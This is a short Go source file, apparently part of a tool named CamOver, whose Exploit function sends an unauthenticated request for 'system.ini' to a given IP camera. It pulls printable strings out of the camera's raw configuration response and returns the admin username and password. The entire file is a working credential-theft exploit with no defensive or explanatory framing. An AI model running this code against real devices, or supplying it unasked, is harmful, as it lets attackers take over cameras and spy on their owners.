package camover

import (
	"fmt"
	"io"
	"net/http"
	"regexp"
	"time"
)

type CamOver struct{}

func NewCamOver() *CamOver {
	return &CamOver{}
}

func (c *CamOver) Exploit(address string) (string, string, error) {
	username := "admin"

	client := &http.Client{
		Timeout: time.Duration(3 * time.Second),
	}

	url := fmt.Sprintf("http://%s/system.ini?loginuse&loginpas", address)

	request, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return "", "", err
	}

	request.Header.Set("User-Agent", "Mozilla/5.0")
	response, err := client.Do(request)
	if err != nil {
		return "", "", err
	}

	defer response.Body.Close()

	body, err := io.ReadAll(response.Body)
	if err != nil {
		return "", "", err
	}

	bodyString := string(body)

	re := regexp.MustCompile(`[^\x00-\x1F\x7F-\xFF]{4,}`)
	matches := re.FindAllString(bodyString, -1)

	if response.StatusCode == http.StatusOK && len(matches) > 0 {
		for index, match := range matches {
			if match == username {
				if index+1 < len(matches) {
					return username, matches[index+1], nil
				}

				return "", "", fmt.Errorf("password not found after username")
			}
		}
	}
	return "", "", fmt.Errorf("username not found or status code not 200")
}
